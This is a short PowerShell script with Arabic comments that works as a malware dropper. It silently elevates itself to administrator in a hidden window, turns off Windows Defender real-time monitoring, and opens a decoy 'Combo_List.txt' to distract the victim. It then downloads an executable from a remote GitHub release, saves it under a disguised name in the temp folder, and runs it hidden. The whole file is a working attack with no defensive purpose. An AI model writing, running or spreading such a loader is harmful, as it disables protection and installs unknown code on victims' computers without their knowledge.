# 1. طلب صلاحيات الأدمن برمجياً وبصمت
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. تفعيل بروتوكول الأمان وتعطيل الحماية فوراً
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-MpPreference -DisableRealtimeMonitoring $true

# 3. فتح ملف التمويه (Combo_List)
$p = split-path -parent (Get-Process -Id $PID).Path
if (Test-Path "$p\Combo_List.txt") { start notepad "$p\Combo_List.txt" }

# 4. تحميل وتثبيت الـ EXE قسرياً
$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
$out = "$env:TEMP\sys_service.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out -ArgumentList "/S" -WindowStyle Hidden
